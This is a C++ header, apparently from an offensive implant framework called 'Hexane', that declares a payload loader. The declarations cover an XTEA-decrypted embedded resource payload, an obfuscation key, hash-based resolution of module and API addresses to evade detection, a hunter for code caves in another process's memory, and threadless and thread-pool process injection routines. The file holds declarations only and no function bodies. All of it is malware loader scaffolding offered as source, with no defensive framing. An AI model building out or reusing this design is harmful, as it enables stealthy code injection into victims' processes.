#ifndef HEXANE_LOADERS_HPP
#define HEXANE_LOADERS_HPP
#include <core/include/monolith.hpp>
#include <core/include/names.hpp>
#include <core/include/hash.hpp>
#include <loader/resource.hpp>

BYTE Opcode[5]   = { 0xE8, 0x00, 0x00, 0x00, 0x00 };
BYTE Export[24]   = { FUNC };
BYTE Parent[24]   = { PARENT };
BYTE Module[24]   = { MODULE };
BYTE Loader[24]   = { LOADER };
BYTE m_key[16]    = { OBF_KEY };

EXTERN_C VOID Execute();

#define PAYLOAD_SIZE    (sizeof(Loader) + Rsrc->Size)
#define FNV_OFFSET      (const unsigned int) 2166136261
#define FNV_PRIME	    (const unsigned int) 16777619
#define XTEA_DELTA      (const unsigned int) 0x9E3779B9
#define NROUNDS         (const unsigned int) 64

#define MS_PER_SECOND	1000
#define INTERVAL(x) 	(x % 21)

typedef struct {
    LPVOID  ResLock;
    HGLOBAL hGlobal;
    SIZE_T  Size;
} RSRC, *ORSRC;

struct u32Block {
    uint32_t v0;
    uint32_t v1;
};

struct CipherTxt {
    uint32_t table[64];
};

namespace Loaders {

    namespace Utils {
        VOID    x_memcpy(LPVOID Dst, CONST LPVOID Src, SIZE_T n);
        PVOID   x_memset (PVOID dst, INT val, SIZE_T len);
        SIZE_T  x_strlen(CONST LPSTR s);
        SIZE_T  x_wcslen(CONST LPWSTR s);
        SIZE_T  x_wcstombs(LPSTR str, LPWSTR wcs, SIZE_T size);
        SIZE_T  x_mbstowcs(LPWSTR Dst, LPSTR Src, SIZE_T Size);
        SIZE_T  x_strcmp(LPSTR Str1, LPSTR Str2);
        SIZE_T  x_wcscmp(LPWSTR Str1, LPWSTR Str2);
        INT     x_memcmp(CONST LPVOID s1, CONST LPVOID s2, SIZE_T n);
    }

    namespace Cipher {
        template<typename T>
        DWORD GetHashFromString(T Str, SIZE_T Len);
        VOID XteaCrypt(PBYTE data, SIZE_T cbData, BOOL encrypt);
    }

    namespace Memory {
        VOID        MmSecureZero(LPVOID Ptr, SIZE_T n);
        HANDLE      LdrGetParentHandle(HEXANE_CTX &Ctx, PBYTE Parent);
        HINSTANCE   LdrGetModuleAddress(DWORD Hash);
        FARPROC     LdrGetSymbolAddress(HMODULE Base, DWORD Hash);
        UINT_PTR    MmCaveHunter(HEXANE_CTX &Ctx, HANDLE Proc, UINT_PTR Export, SIZE_T Size);
    }

    namespace Injection {
        VOID DLL_EXPORT Threadless(HMODULE Base);
        VOID DLL_EXPORT ThreadPool(HMODULE Base);
    }
}
#endif //HEXANE_LOADERS_HPP
